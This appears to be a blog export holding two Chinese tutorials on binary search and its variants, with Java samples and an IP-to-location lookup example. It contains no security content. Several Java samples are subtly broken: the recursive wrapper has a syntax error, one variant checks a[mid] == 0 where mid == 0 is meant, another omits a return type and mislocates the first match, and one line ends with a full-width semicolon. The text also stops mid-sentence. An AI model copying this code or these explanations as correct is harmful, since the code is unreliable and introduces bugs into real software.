log_2n$。所以时间复杂度是O(logn)。</p>\n<p>二分查找是我们目前为止遇到的第一个时间复杂度为O(logn)的算法。后面我们还会讲堆、二叉树的操作等，他们的时间复杂度也是O(logn)。我这里就在深入讲讲O(logn)这种对数时间复杂度。这是一种极其高效的时间复杂度，有的时候甚至比时间复杂度是常量级O(1)的算法还要高效。为什么这么说呢？</p>\n<p>因为logn是一个非常“恐怖”的量级，即便n非常非常大，对应的logn也很小，比如n等于2的32次方，这个数很大了吧？大约是42亿。也就是说，如果我们在42亿个数据中用二分查找一个数据，最多需要比较32次。</p>\n<p>我们前面讲过，用大O表示法表示时间复杂度的时候，会省略掉常数、系数和低阶。对于常量级时间复杂度的算法来说，O(1)有可能表示的是一个非常大的常数量，比如O(1000)、O(10000)。所以常量级时间复杂度的算法有时候可能还没有O(logn)的算法执行效率高。</p>\n<p>反过来，对数对应的就是指数。有一个非常著名的“阿基米德与国王下棋的故事”，你可以自行搜索一下，感受一下指数的”恐怖”。这也是为什么我们说，指数级时间复杂度的算法在大规模数据面前是无效的。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"二分查找的递归实现与非递归实现\"><a href=\"#二分查找的递归实现与非递归实现\" class=\"headerlink\" title=\"二分查找的递归实现与非递归实现\"></a>二分查找的递归实现与非递归实现</h3></div><br></div>\n\n<p>实际上，简单的二分查找并不难写，注意这里的”简单”二字。下一节，我们会讲到二分查找的变体问题，那才是烧脑的。今天，我们来看看如果写简单的二分查找。</p>\n<p><strong>最简单的情况就是有序数组中不存在重复的元素</strong>，我们在其中用二分查找值等于给定值的数据，我用Java代码实现了一个简单的二分查找算法。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// a 有序数组</span></span><br><span class=\"line\"><span class=\"comment\">// n 数组大小</span></span><br><span class=\"line\"><span class=\"comment\">// value 待查找的元素</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">binarySearch</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> value)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> low = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> high = n-<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(low &lt;= high)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> mid = (high + low)/<span class=\"number\">2</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(a[mid] == value) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> mid;</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(a[mid] &lt; value) &#123;</span><br><span class=\"line\">\t\t\tlow = mid + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\thigh = mid -<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> -<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这段代码我稍微解释一下，low、high、mid都是指数组下标，其中，low和high表示当前查找的区间范围，初始low=0，high=n-1。mid表示[low、high]的中间位置。我们通过对比a[mid] 和value的大小，来更新接下来要查找的区间范围，知道找到或者区间缩小为0，就退出。如果你有一些编程基础，看懂这些应该不难。现在，我们着重看一下容易出错的3个地方。</p>\n<p><strong>1、循环退出条件</strong></p>\n<p>注意是low&lt;=high， 而不是low &lt; high</p>\n<p><strong>2、mid的取值</strong></p>\n<p>实际上，mid=(low+high)/2 这种写法是有问题的，因为如果low和high比较大的话，两者之和就有可能会溢出。改进方案是将mid的计算方式改写成low+(high-low)/2，更进一步，如果要将性能优化到极致的话，我们可以将除2的操作转化为位运算low+((high-low)&gt;&gt;1)，因为相比较除法运算来说，计算机处理位运算要快得多。</p>\n<p><strong>3、low和high的更新</strong></p>\n<p>low=mid+1，high=mid-1,。注意这里的+1和-1，如果直接写成low=mid或者high=mid，就可能会发生死循环。比如，当high=3，low=3时，如果a[3]不等于value，就会导致一直循环不退出。</p>\n<p>如果你已经留意到上面讲到的三点，我想你已经可以实现一个简单的二分查找了。实际上，二分查找除了用循环来实现，还可以用递归来实现，过程也非常简单。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">binarySearch</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a,<span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> value)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> binarySearch(<span class=\"keyword\">int</span>[] a, <span class=\"number\">0</span>, n-<span class=\"number\">1</span>, value);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">binarySearch</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> low, <span class=\"keyword\">int</span> high, <span class=\"keyword\">int</span> value)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(low &gt; high) <span class=\"keyword\">return</span> -<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> mid = low + ((high-low)&gt;&gt;<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a[mid] == value) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> mid;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(a[mid] &lt; value) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> binarySearch(a, mid+<span class=\"number\">1</span>, high, value);</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> binarySearch(a, low, mid-<span class=\"number\">1</span>, value);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"二分查找应用场景的局限性\"><a href=\"#二分查找应用场景的局限性\" class=\"headerlink\" title=\"二分查找应用场景的局限性\"></a>二分查找应用场景的局限性</h3></div><br></div>\n\n<p>前面我们分析过，二分查找的时间复杂度是O(logn)，查找数据的效率非常高。不过，并不是什么情况下都可以用二分查找，他的应用场景是有很大局限性的。那么什么情况下适合用二分查找，什么情况下不适合呢？</p>\n<p><strong>首先，二分查找依赖的是顺序表结构，简单点说就是数组</strong></p>\n<p>那二分查找能否依赖其他数据结构呢？比如链表，答案是不可以，主要是二分查找算法需要按照下标随机访问元素。我们在数组和链表那两节讲过，数组按照下标随机访问数据的时间复杂度是O(1)，而链表随机访问的时间复杂度是O(n)。所以，如果数据使用链表存储，二分查找的时间复杂度就会变得很高。</p>\n<p>二分查找只能用在数据是通过顺序表来存储的数据结构上，如果你的数据是通过其他结构存储的，则无法应用二分查找。</p>\n<p><strong>其次，二分查找针对的是有序数据</strong></p>\n<p>二分查找对这一点的要求比较严苛，数据必须是有序的。如果数据没有序，我们需要先排序。前面章节我们讲过，排序时间复杂度最低的是O(nlogn)。所以，如果我们针对的是一组静态数据，没有频繁地插入、删除，我们可以进行一次排序，多次二分查找。这样排序的成本可被均摊，二分查找的边际成本就会比较低。</p>\n<p>但是，如果我们的数据集合有频繁的插入、删除操作，要想用二分查找，要么每次插入、删除操作之后保证数据仍然有序，要么在每次二分查找之前都要先进行排序。针对这种动态数据集合，无论哪种方法，维护有序的成本都是很高的。</p>\n<p>所以二分查找只能用在插入、删除操作不频繁，一次排序多次查找的场景中。针对动态变化的数据集合，二分查找将不再适用。针对动态的数据集合，如何在其中快速查找某个数据呢？等到二叉树那一节会详细讲。</p>\n<p><strong>再次，数据量太小不太适合二分查找</strong>.</p>\n<p>如果要处理的数据量太小，完全没有必要使用二分查找，顺序遍历就可以了。比如我们在一个大小为10的数组中查找一个元素，不管是用二分查找，还是顺序遍历，查找速度都差不多。只有数据量较大的时候，二分查找的优势才比较明显。</p>\n<p>不过，这里有一个例外，如果数据之间的比较操作比较耗时，不管数据量大小，都推荐使用二分查找。比如数组中存储的数据都是长度查过300的字符串，如此长的两个字符串之间比对大小，就会非常耗时。我们需要尽可能煎炒比较次数，而比较次数的减少会大大提高性能能，这个时候二分查找就比顺序遍历更有优势。</p>\n<p><strong>最后，数据量太大也不适合用二分查找</strong></p>\n<p>二分查找的底层需要依赖数组这种数据结构，而数组为了支持随机访问的特性，要求内存空间连续，对内存空间的要求比较严苛。比如，我们有1GB大小的数据，如果希望用数组来存储，那就需要1GB的连续内存空间。</p>\n<p>注意这里的”连续”二字，也就是说，即便有2GB的内存空间剩余，如果没有连续的1GB大小的内存空间，那照样无法申请一个1GB大小的数组。而我们的二分查找是作用在数组这种数据结构之上的，所以太大的数据用数组存储就比较吃力了，也就不能用二分查找了。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>二分查找的理论知识你应该已经掌握了，我们来看下开篇的思考题：如何在1000万个整数中快速查找某个整数。</p>\n<p>这个问题并不难，我们的内存限制是100MB，每个数据大小为8字节，最简单的办法就是将数据存储在数组中，内存占用差不多是80MB，符合内存的限制。借助今天讲的内容，我们可以先对这1000万个数据进行从小到大排序，然后再利用二分查找算法，就可以快速查找出想要的数据了。</p>\n<p>看起来这个问题并不难，很轻松就能解决。实际上，它暗藏玄机，如果你对数据结构和算法有一定了解，知道散列表、二叉树这些支持快速查找的动态数据结构，你可能会觉得，用散列表、二叉树也可以解决这个问题，实际上是不行的。</p>\n<p>虽然大部分情况下，用二分查找可以解决的问题，用散列表、二叉树都可以解决。但是，我们后面会讲到，不管是散列表还是二叉树，都会需要比较多的额外的内存空间，如果用散列表或者二叉树来存储这1000万个数据，用100MB的内存肯定是存储不下来的。而二分查找底层依赖的是数组，除了数据本身之外，不需要额外的其他信息，是最省内存空间的存储方式，所以刚好能在限定的内存大小内解决这个问题。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>今天我们学习了一种针对有序数据的一种高效的查找算法，二分查找，它的时间复杂度是O(logn)。</p>\n<p>二分查找的算法核心思想理解起来非常简单，有点类似分治思想。即每次都通过跟区间的中间元素进行对比，将待查找的区间缩小为一半，直到找到要查找的元素，或者区间被缩小为0。但是二分查找的代码比较容易写错，你需要着重掌握三个容易出错的地方：循环退出条件、mid的取值、low和high的更新。</p>\n<p>二分查找虽然性能比较优秀，但是应用场景比较有限。底层必须依赖数组，并且还要求数据有序。对于较小规模的数据查找，我们直接使用顺序遍历就可以了，二分查找的优势并不明显。二分查找更适合处理静态数据，也就是没有频繁的数据插入、删除操作。</p>\n<h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3><p>1、如何编程实现”求一个数的平方根”？要求精确到小数点后6位。</p>\n<p>2、我刚才说了，如果数据使用链表存储，二分查找的时间复杂度就会变得很高，那查找的时间复杂度究竟是多少呢？如果你自己推导一下，你就会深刻的认识到，为何我们回西安则用数组而不用链表来实现二分查找了。</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-二分查找(下)","date":"2018-11-09T06:31:00.000Z","mathjax":true,"_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n通过IP地址来查找IP归属地的功能，不知道那有没有用过？没用过也没关系，你现在就可以打开百度，在搜索框中随便输入一个IP地址，就会看到它的归属地。\n\n{% asset_img IP地址归属地查询.jpg %}\n\n这个功能并不复杂，它是通过维护一个很大的IP地址库来实现的。地址库汇总包括IP地址范围和归属地对应的关系。\n\n当我们想要查询202.102.133.13这个IP地址的归属地时，我们就在地址库中搜索，发现这个IP地址落在[202.102.133.0, 202.102.133.255]这个地址范围内，那我们就可以将这个IP地址范围对应的归属地\"山东东营市\"显示给用户了。\n\n**现在我的问题是，在庞大的地址库中逐一对比IP地址所在的区间，是非常耗时的。假设我们有12万条这样的IP区间与归属地的对应关系，如何快速定位出一个IP地址的归属地呢？**\n\n是不是觉得比较难？不要紧，等学完今天的内容，你就会发现这个问题其实很简单。\n\n上一节我讲了二分查找的原理，并且介绍了最简单的一种二分查找的代码实现。今天我们来讲几种二分查找的变形问题。\n\n不知道你有没有听过这样一个说法：\"十个二分九个错\"。二分查找虽然原理极其简单，但是想要写出没有bug的二分查找并不容易。\n\n康纳德·克努特(Donald E.Knuth) 在《计算机程序设计艺术》的第3卷《排序与查找》中说到\"尽管第一个二分查找算法于1946年出现，然后第一个完全正确的二分查找算法实现直到1962年才出现\"。\n\n你可能会说，我们上一节学的二分查找的代码实现并不难写啊。那是因为上一节讲的只是二分查找的一种最简单的情况，在不存在重复元素的有序数组中，查找给定值的元素。最简单的二分查找写起来确实不难，但是，二分查找的变形问题就没有那么好写了。\n\n二分查找的变形问题很多，我只选择几个典型的来讲解，其它你可以借助我今天讲的思路来分析。\n\n四种常见的二分查找的变形问题：\n\n* 查找第一个值等于给定值的元素\n* 查找最后一个值等于给定值的元素\n* 查找第一个大于等于给定值的元素\n* 查找最后一个小于给定值的元素\n\n需要特别说明一点，为了简化讲解，今天的内容，我都以数据是从小到大排列为前提，如果你要处理的数据是从大到小排列的，解决思路也是一样的。同时，我希望你最好先自己动手试着写一下这4个变形问题，然后再看看我的讲述，这样你就会对我说的\"二分查找比较难写\"有更加深刻的体会了。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 变体1：查找第一个值等于给定值的元素\n{% endnote %}\n</div>\n\n上一节中的二分查找是最简单的一种，即有序数据集合中不存在重复的数据，我们在其中查找值等于某个给定值的数据。如果我们将这个问题稍微修改下，有序数据集合中存在重复的数据，我们希望找到第一个值等于给定值的数据，止痒之前的二分查找代码还能工作吗？\n\n比如下面这样一个有序数组，其中，a[5], a[6], a[7]的值都等于8，是重复的数据，我们希望找到第一个等于8的数据，也就是下标是5的元素。\n\n{% asset_img 有序数组.jpg %}\n\n如果我们用上一节课讲的二分查找的代码实现，首先拿8与区间的中间值a[4] 比较，8比6大，于是在下标5到9之间继续查找。下标5和9中间的位置是下标7，a[7]正好等于8，所以代码就返回了。\n\n尽管a[7]也等于8，但它并不是我们想找的第一个等于8的元素，因为第一个值等于8的元素是下标为5的元素。我们上一节讲的二分查找代码就无法处理这种情况了。所以针对这个变形问题，我们可以稍微改造上一节的代码。\n\n100个人写二分查找就会有100中写法。网上有很多关于变形二分查找的实现方法，有很多写的非常简洁，比如下面这个写法。但是，尽管简洁，理解起来却非常烧脑，也很容易写错。\n\n```java\npublic binarySearch01(int[] a, int n, int value){\n\tint low = 0;\n\tint high = n-1;\n\n\twhile(low <= high) {\n\t\tint mid = low + ((high-low)>>1);\n\t\tif(a[mid] > value){\n\t\t\thigh = mid -1;\n\t\t}else {\n\t\t\tlow = mid + 1;\n\t\t}\n\t}\n\n\tif (low < n && a[low] == value) {\n\t\treturn low;\n\t}else{\n\t\treturn -1;\n\t}\n}\n```\n\n看完之后，你是不是觉得很不好理解？如果你只是死记硬背这个写法，我敢保证，过不了几天，你就会全部忘光，再让你写，90%的可能会写错。所以，我换了一种实现方法，你看看是不是更容易理解。\n\n```java\npublic int binarySearch01(int[] a, int n, int value){\n\tint low=0;\n\tint high = n-1;\n\n\twhile(low <= high) {\n\t\tint mid = low + ((high-low)>>1);\n\t\tif (a[mid] > value) {\n\t\t\thigh = mid - 1;\n\t\t}else if (a[mid] < value) {\n\t\t\tlow = mid + 1;\t\t\t\n\t\t}else {\n\t\t\tif(a[mid] == 0 || a[mid-1] != value) {\n\t\t\t\treturn mid;\n\t\t\t}else{\n\t\t\t\thigh = mid - 1;\n\t\t\t}\n\t\t}\n\t}\n\treturn -1;\n}\n```\n\n我来稍微解释一下这段代码。a[mid] 跟要查找的value的大小关系有三种情况：大于、小于、等于。 对于a[mid]>value的情况，我们需要更新high=mid-1；对于a[mid]< value的情况，我们需要更新low=mid+1。这两点都好理解，那当a[mid]=value的时候该如何处理呢？\n\n如果我们查找的是任意一个值等于给定值的元素，当a[mid]等于要查找的值时，a[mid]就是我们要查找的元素。但是如果我们要查找的是第一个值等于给定值的元素，当a[mid]等于要查找的值时，我们就需要确认一下这个元素是不是第一个定于给定值的元素。\n\n我们重点看一下第12行代码。如果mid等于0，那这个元素已经是数组的第一个元素，那它肯定是我们要找的。如果mid不等于0，但a[mid]的前一个元素a[mid-1]不等于value，那也说明a[mid]就是我们要找的第一个值等于给定值的元素。\n\n如果经过检查之后发现a[mid]前面的一个元素a[mid-1]也等于value，那说明此时的a[mid]肯定不是我们要找的第一个值等于给定值的元素。那我们就更新high=mid-1，因为我们要查找的元素肯定出现在[low. mid-1]之间。\n\n对比上面的两段代码，是不是下面那种更好理解？实际上，很多人觉得变形的二分查找很难，主要原因是追求第一种那样完美、简洁的写法。而对于我们做工程开发的人来说，代码易读懂、没Bug，其实更重要。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 变体2：查找最后一个值等于给定值的元素\n{% endnote %}\n</div>\n\n前面的问题是查找第一个值等于给定值的元素，我现在把问题稍微修改一下，查找最后一个只等于给定值的元素，又该如何做呢？\n\n如果你掌握了前面的写法，那这个问题你应该轻松就能解决，你可以先试着写一下，然后跟我写的对比一下。\n\n```java\npublic int binarySearch02(int[] a, int n, int value){\n\tint low = 0;\n\tint high = n-1;\n\twhile (low <= high) {\n\t\tint mid = low + ((high-low)>>1);\n\t\tif(a[mid]<value) {\n\t\t\tlow = mid + 1;\n\t\t}else if (a[mid] > value){\n\t\t\thigh = mid - 1;\n\t\t}else {\n\t\t\tif (mid == n-1 || a[mid + 1] != value ){\n\t\t\t\treturn mid;\n\t\t\t}else {\n\t\t\t\tlow = mid + 1;\n\t\t\t}\n\t\t}\n\t}\n\treturn -1;\n}\n```\n\n我们还是重点看一下11行代码。如果a[mid]已经是这个数组中最后一个元素了，那它肯定是我么要找的；如果a[mid+1]不等于value，那也说明a[mid]就是我们要找的最后一个值等于给定值的元素。\n\n如果我们经过检查之后，发现a[mid]后面的一个元素a[mid+1]也等于value，那说明当前的元素并不是最后一个只等于给定值的元素，我们更新low=mid+1，因为要找的元素肯定在[mid+1, high]之间。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 变体3：查找第一个大于等于给定值的元素\n{% endnote %}\n</div>\n\n现在我们来看另一类变形问题。在有序数组中，查找第一个大于等于给定值的元素。比如数组中存储的这样一个序列：3,4,6,7,10.如果查找第一个大于等于5的元素，那就是6。\n\n实际上，实现的思路跟上面两种变形问题的实现思路类似，代码写起来甚至更简洁。\n\n```java\npublic int binarySearch03(int[] a, int n, int value){\n\tint low = 0;\n\tint high = n -1;\n\twhile(low<=high){\n\t\tint mid = low + ((high - low) >> 1); \n\t\tif(a[mid] >= value) {\n\t\t\tif (mid == 0 || a[mid-1] < value) {\n\t\t\t \treturn mid;\n\t\t\t }else {\n\t\t\t \thigh = mid - 1;\n\t\t\t }\n\t\t}else {\n\t\t\tlow = mid + 1;\n\t\t}\n\t}\n\treturn -1;\n}\n```\n\n如果a[mid] 小于要查找的值value，那要查找的值肯定在[mid+1, high]之间，所以我们更新low = mid + 1。\n\n对于a[mid] 大于等于给到你告知value的情况，我们要先看下这个a[mid]是不是我们要找的第一个值大于等于给定值的元素。如果a[mid]的前面已经没有元素，或者前面一个元素小于要查找的值value，那a[mid]就是我们要找的元素，这段逻辑对应的代码是第7行。\n\n如果a[mid-1]也大于等于要查找的值value，那说明我们要查找的元素在[low, mid-1]之间，所以我们将high更新为mid-1。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 变体3：查找最后一个值小于等于给定值的元素\n{% endnote %}\n</div>\n\n现在，我们来看最后一种二分查找的变形问题，查找最后一个值小于等于给定值的元素。比如，数组中存储了这样一组数据：3,5,6,8,9,10。最后一个小于等于7的元素是6.是不是有点类似上面那一种？实际上实现思路也是类似的。\n\n有了前面的基础，你完全可以自己写出来了，所以我就不详细分析了。你可以自己写一下然后对比一下。\n\n```java\npublic int binarySearch04(int[] a, int n, int value){\n\tint low = 0;\n\tint high = n-1;\n\twhile(low <= high) {\n\t\tint mid = low + ((high - low) >> 1); \n\t\tif (a[mid] <= value) {\n\t\t\tif (mid == n-1 || a[mid + 1] > value) {\n\t\t\t\treturn mid;\n\t\t\t}else {\n\t\t\t\tlow = mid + 1;\n\t\t\t}\n\t\t}if (a[mid] > value) {\n\t\t\thigh = mid - 1;\n\t\t}\n\t}\n\treturn -1；\n}\n```\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n好了，现在我们来看开篇的问题：如何快速定位出一个IP地址的归属地？\n\n现在这个问题应该很简单了。如果IP区间与归属地的对应关系不经常更新，我们可以预先处理这12万条数据，让其按照起始IP从小到大排序。如何来排序呢？我们知道IP地址可以转化为32位的整型数，所以我们可以将起始IP地址按照对应的整型值的大小关系，从小到大进行排序。\n\n然后这个问题就可以转化为我们刚讲的第四种变形问题\"在有序数组中，查找最后一个等于某个给定值的元素\"了。\n\n当我们要查找某个IP归属地时，我们可以先通过二分查找，找到最后一个起始IP小于等于这个IP的IP区间，如果在，我们就取出对应的归属地显示；如果不在，就返回未查找到。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n上一节说过，凡是用二分查找能解决的，绝大部分我们更倾向于用散列表和二叉查找树。即便是二分查找在内存使用上更节省，但是毕竟内存如此紧缺的情况并不多，那二分查找真的没什么用处了吗？\n\n实际上，上一节讲的求\"值等于给定值\"的二分查找缺失不怎么会被用到，二分查找更适合用在\"近似\"查找问题，在这类问题上，二分查找的优势更明显。比如今天讲的这几种变体问题，用其他数据结构，如散列表、二叉树，就比较难实现了。\n\n变体的二分查找算法写起来非常烧脑，很容易因为细节处理不好而产生bug，这些容易出错的细节有：**终止条件、区间上下界更新方法、返回值选择**。所以今天讲的内容你最好能自己实现一遍，对锻炼编码能力、逻辑思维、写出bug free代码，会很有帮助。\n\n\n### 课后思考\n\n我们今天讲的都是非常规的二分查找问题，今天的思考题也是一个非常规的二分查找问题。如果有序数组是一个循环有序数组，比如4,5,6,1,2,3。针对这种情况，如何实现一个求\"值等于给定值\"的二分查找算法呢？\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-二分查找-下.md","raw":"---\ntitle: 算法-二分查找(下)\ndate: 2018-11-09 14:31:00\ntags: ['算法','二分查找']\ncategories: 算法\nmathjax: true\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n通过IP地址来查找IP归属地的功能，不知道那有没有用过？没用过也没关系，你现在就可以打开百度，在搜索框中随便输入一个IP地址，就会看到它的归属地。\n\n{% asset_img IP地址归属地查询.jpg %}\n\n这个功能并不复杂，它是通过维护一个很大的IP地址库来实现的。地址库汇总包括IP地址范围和归属地对应的关系。\n\n当我们想要查询202.102.133.13这个IP地址的归属地时，我们就在地址库中搜索，发现这个IP地址落在[202.102.133.0, 202.102.133.255]这个地址范围内，那我们就可以将这个IP地址范围对应的归属地\"山东东营市\"显示给用户了。\n\n**现在我的问题是，在庞大的地址库中逐一对比IP地址所在的区间，是非常耗时的。假设我们有12万条这样的IP区间与归属地的对应关系，如何快速定位出一个IP地址的归属地呢？**\n\n是不是觉得比较难？不要紧，等学完今天的内容，你就会发现这个问题其实很简单。\n\n上一节我讲了二分查找的原理，并且介绍了最简单的一种二分查找的代码实现。今天我们来讲几种二分查找的变形问题。\n\n不知道你有没有听过这样一个说法：\"十个二分九个错\"。二分查找虽然原理极其简单，但是想要写出没有bug的二分查找并不容易。\n\n康纳德·克努特(Donald E.Knuth) 在《计算机程序设计艺术》的第3卷《排序与查找》中说到\"尽管第一个二分查找算法于1946年出现，然后第一个完全正确的二分查找算法实现直到1962年才出现\"。\n\n你可能会说，我们上一节学的二分查找的代码实现并不难写啊。那是因为上一节讲的只是二分查找的一种最简单的情况，在不存在重复元素的有序数组中，查找给定值的元素。最简单的二分查找写起来确实不难，但是，二分查找的变形问题就没有那么好写了。\n\n二分查找的变形问题很多，我只选择几个典型的来讲解，其它你可以借助我今天讲的思路来分析。\n\n四种常见的二分查找的变形问题：\n\n* 查找第一个值等于给定值的元素\n* 查找最后一个值等于给定值的元素\n* 查找第一个大于等于给定值的元素\n* 查找最后一个小于给定值的元素\n\n需要特别说明一点，为了简化讲解，今天的内容，我都以数据是从小到大排列为前提，如果你要处理的数据是从大到小排列的，解决思路也是一样的。同时，我希望你最好先自己动手试着写一下这4个变形问题，然后再看看我的讲述，这样你就会对我说的\"二分查找比较难写\"有更加深刻的体会了。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 变体1：查找第一个值等于给定值的元素\n{% endnote %}\n</div>\n\n上一节中的二分查找是最简单的一种，即有序数据集合中不存在重复的数据，我们在其中查找值等于某个给定值的数据。如果我们将这个问题稍微修改下，有序数据集合中存在重复的数据，我们希望找到第一个值等于给定值的数据，止痒之前的二分查找代码还能工作吗？\n\n比如下面这样一个有序数组，其中，a[5], a[6], a[7]的值都等于8，是重复的数据，我们希望找到第一个等于8的数据，也就是下标是5的元素。\n\n{% asset_img 有序数组.jpg %}\n\n如果我们用上一节课讲的二分查找的代码实现，首先拿8与区间的中间值a[4] 比较，8比6大，于是在下标5到9之间继续查找。下标5和9中间的位置是下标7，a[7]正好等于8，所以代码就返回了。\n\n尽管a[7]也等于8，但它并不是我们想找的第一个等于8的元素，因为第一个值等于8的元素是下标为5的元素。我们上一节讲的二分查找代码就无法处理这种情况了。所以针对这个变形问题，我们可以稍微改造上一节的代码。\n\n100个人写二分查找就会有100中写法。网上有很多关于变形二分查找的实现方法，有很多写的非常简洁，比如下面这个写法。但是，尽管简洁，理解起来却非常烧脑，也很容易写错。\n\n```java\npublic binarySearch01(int[] a, int n, int value){\n\tint low = 0;\n\tint high = n-1;\n\n\twhile(low <= high) {\n\t\tint mid = low + ((high-low)>>1);\n\t\tif(a[mid] > value){\n\t\t\thigh = mid -1;\n\t\t}else {\n\t\t\tlow = mid + 1;\n\t\t}\n\t}\n\n\tif (low < n && a[low] == value) {\n\t\treturn low;\n\t}else{\n\t\treturn -1;\n\t}\n}\n```\n\n看完之后，你是不是觉得很不好理解？如果你只是死记硬背这个写法，我敢保证，过不了几天，你就会全部忘光，再让你写，90%的可能会写错。所以，我换了一种实现方法，你看看是不是更容易理解。\n\n```java\npublic int binarySearch01(int[] a, int n, int value){\n\tint low=0;\n\tint high = n-1;\n\n\twhile(low <= high) {\n\t\tint mid = low + ((high-low)>>1);\n\t\tif (a[mid] > value) {\n\t\t\thigh = mid - 1;\n\t\t}else if (a[mid] < value) {\n\t\t\tlow = mid + 1;\t\t\t\n\t\t}else {\n\t\t\tif(a[mid] == 0 || a[mid-1] != value) {\n\t\t\t\treturn mid;\n\t\t\t}else{\n\t\t\t\thigh = mid - 1;\n\t\t\t}\n\t\t}\n\t}\n\treturn -1;\n}\n```\n\n我来稍微解释一下这段代码。a[mid] 跟要查找的value的大小关系有三种情况：大于、小于、等于。 对于a[mid]>value的情况，我们需要更新high=mid-1；对于a[mid]< 